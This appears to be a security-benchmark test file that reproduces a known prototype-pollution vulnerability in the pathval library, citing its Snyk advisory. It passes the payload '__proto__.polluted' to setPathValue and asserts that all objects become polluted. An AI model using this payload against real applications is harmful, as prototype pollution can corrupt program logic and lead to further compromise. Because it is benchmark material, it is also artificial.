//https://snyk.io/vuln/SNYK-JS-PATHVAL-596926
test("prototype pollution in pathval", () => {
  var pathval = require("pathval");

  var obj = {};
  expect({}.polluted).toBe(undefined);

  pathval.setPathValue(obj, process.env.SECBENCH_PAYLOAD || "__proto__.polluted", "yes");
  expect({}.polluted).toBe("yes");
});
